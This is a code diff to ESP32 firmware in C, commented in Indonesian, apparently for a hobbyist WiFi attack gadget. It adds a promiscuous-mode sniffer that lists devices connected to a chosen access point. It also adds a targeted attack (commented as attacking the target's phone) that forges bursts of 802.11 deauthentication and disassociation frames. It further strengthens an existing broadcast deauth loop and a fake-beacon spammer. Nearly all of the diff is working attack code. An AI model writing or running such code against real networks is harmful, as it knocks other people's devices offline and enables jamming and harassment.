@@ -10,6 +10,7 @@
 #include "esp_netif.h"
 
 
+
 // Fungsi sakti buat ubah Teks MAC ke Bytes
 void stringToMac(const char* macStr, uint8_t *macAddr) {
     unsigned int m[6];
@@ -27,9 +28,9 @@ uint8_t beaconPacket[128] = {
 };
 
 const char* fakeSSIDs[] = {
-    "Pencuri Data", "HP Anda Terhack", "RootX-Terminal", 
-    "Beli Bakso Gratis", "Koneksi Lemot", "Polisi Siber", 
-    "Minta Password?", "Pencari Janda"
+    "Malinggg", "Penjinak Naga", "Toko Bangunan", 
+    "Gapunya Kuota??", "Wifi Gratisss", "Kantor Polisi", 
+    "ADUH KUOTA HABIS", "Pencari Janda", "Pencari Tobrut", "RUNGKAD"
 };
 
 const char* rickRollLyrics[] = {
@@ -41,6 +42,49 @@ const char* rickRollLyrics[] = {
 
 uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
+
+// Tambahin callback sniffer di wifi_system.c
+void station_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_DATA) return; 
+
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    uint8_t *frame = pkt->payload;
+
+    uint8_t targetApMac[6];
+    stringToMac(targetTerkunci.mac, targetApMac);
+
+    uint8_t *addr1 = frame + 4;  
+    uint8_t *addr2 = frame + 10; 
+    uint8_t *addr3 = frame + 16; 
+
+    uint8_t clientMac[6] = {0};
+    bool isTargetNetwork = false;
+
+    if (memcmp(addr1, targetApMac, 6) == 0)      { memcpy(clientMac, addr2, 6); isTargetNetwork = true; } 
+    else if (memcmp(addr2, targetApMac, 6) == 0) { memcpy(clientMac, addr1, 6); isTargetNetwork = true; }
+    else if (memcmp(addr3, targetApMac, 6) == 0) { memcpy(clientMac, addr2, 6); isTargetNetwork = true; }
+
+    if (!isTargetNetwork) return; 
+    if (clientMac[0] & 0x01) return;
+
+    for (int i = 0; i < totalStation; i++) {
+        if (memcmp(listStation[i].mac, clientMac, 6) == 0) {
+            listStation[i].rssi = pkt->rx_ctrl.rssi;
+            listStation[i].paket_count++;
+            return;
+        }
+    }
+
+    if (totalStation < 20) { 
+        listStation[totalStation].id = totalStation + 1; 
+        memcpy(listStation[totalStation].mac, clientMac, 6);
+        listStation[totalStation].rssi = pkt->rx_ctrl.rssi;
+        listStation[totalStation].paket_count = 1;
+        totalStation++;
+    }
+}
+
+
 
 void sendBeacon(const char* ssid) {
     int ssidLen = strlen(ssid);
@@ -71,6 +115,8 @@ void sendBeacon(const char* ssid) {
 }
 
 void loopWiFi(void * pvParameters) {
+
+
     // === INITIALIZATION SAKTI (WAJIB ADA DI ESP-IDF) ===
     static bool isWifiInit = false;
     if (!isWifiInit) {
@@ -87,6 +133,7 @@ void loopWiFi(void * pvParameters) {
         if (isSpamming) {
             if (!spamUdahSetup) {
                 // Diubah ke AP sekalian biar sinkron
+                esp_wifi_stop(); 
                 esp_wifi_set_mode(WIFI_MODE_AP); 
                 esp_wifi_start();
                 esp_wifi_set_promiscuous(true);
@@ -112,6 +159,7 @@ void loopWiFi(void * pvParameters) {
             totalWiFi = 0;
 
             // --- SCAN ESP-IDF STYLE ---
+            esp_wifi_stop(); 
             esp_wifi_set_mode(WIFI_MODE_STA);
             esp_wifi_start();
             
@@ -145,7 +193,74 @@ void loopWiFi(void * pvParameters) {
             sedang_scan = false;
             scanDone = true;     
             triggerScan = false; 
+        } else if (triggerTrack) {
+    // Kita scan cepet di channel target buat update RSSI
+    uint8_t targetMac[6];
+    stringToMac(targetTerkunci.mac, targetMac);
+    
+    // Scan sebentar
+    esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+    vTaskDelay(pdMS_TO_TICKS(100)); // Update tiap 100ms biar kerasa live
+    
+    // (Fungsi scan wifi bawaan bakal otomatis update rssi di listWiFi/targetTerkunci)
+}
+
+                    // --- 1. BLOK SCAN STATION (Kunci Channel) ---
+        if (triggerScanSta) {
+            esp_wifi_set_promiscuous(false);
+            esp_wifi_set_promiscuous_rx_cb(&station_sniffer_cb);
+            esp_wifi_set_promiscuous(true);
+            esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+            
+            vTaskDelay(pdMS_TO_TICKS(4000)); // Scan 4 detik
+            
+            triggerScanSta = false;
+            scanStaDone = true;
         }
+
+        // --- 2. BLOK DEAUTH STATION (Serang HP Target) ---
+        else if (isDeauthSta && adaTargetSta) {
+            if (!deauthUdahSetup) {
+                esp_wifi_stop();
+                esp_wifi_set_mode(WIFI_MODE_AP); 
+                esp_wifi_start();
+                esp_wifi_set_promiscuous(true);
+                esp_wifi_set_ps(WIFI_PS_NONE); 
+                esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+                deauthUdahSetup = true;
+            }
+
+            uint8_t apMac[6];      
+            uint8_t clientMac[6];  
+            stringToMac(targetTerkunci.mac, apMac); 
+            memcpy(clientMac, targetSta.mac, 6); 
+
+            for (int b = 0; b < 40; b++) {
+                uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
+                uint8_t rawFrame[26];
+                memcpy(rawFrame, deauthFrame, 26);
+
+                rawFrame[0] = 0xc0; 
+                memcpy(&rawFrame[4], clientMac, 6); 
+                memcpy(&rawFrame[10], apMac, 6);    
+                memcpy(&rawFrame[16], apMac, 6);    
+                rawFrame[22] = seq & 0xFF;
+                rawFrame[23] = (seq >> 8) & 0xFF;
+                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+
+                rawFrame[0] = 0xa0; 
+                memcpy(&rawFrame[4], apMac, 6);      
+                memcpy(&rawFrame[10], clientMac, 6); 
+                memcpy(&rawFrame[16], apMac, 6);     
+                uint16_t seq2 = seq + 1;
+                rawFrame[22] = seq2 & 0xFF;
+                rawFrame[23] = (seq2 >> 8) & 0xFF;
+                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+            }
+            vTaskDelay(pdMS_TO_TICKS(1));
+        }
+
+
         else if (isDeauthing && adaTarget) {
             if (!deauthUdahSetup) {
                 esp_wifi_stop();
@@ -175,17 +290,24 @@ void loopWiFi(void * pvParameters) {
                 rawFrame[22] = seq & 0xFF;
                 rawFrame[23] = (seq >> 8) & 0xFF;
                 rawFrame[24] = 0x01; 
+                
+                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+                
+                rawFrame[0] = 0xa0; 
+                // Sequence number kita bedain dikit biar natural
+                uint16_t seq2 = seq + 1;
+                rawFrame[22] = seq2 & 0xFF;
+                rawFrame[23] = (seq2 >> 8) & 0xFF;
+                rawFrame[24] = 0x08;
 
                 // === REQ LU: TX VIA AP ===
-                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
                 
-                if (err != ESP_OK) {
-                    rawFrame[0] = 0xa0; 
-                    esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
-                }
+                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+                
             }
             vTaskDelay(pdMS_TO_TICKS(1));
-        }
+        }         
+        
 
         // --- MANAJEMEN RADIO WIFI (BIAR GAK PANAS) ---
         if (!isSpamming && !isDeauthing && !triggerScan) {
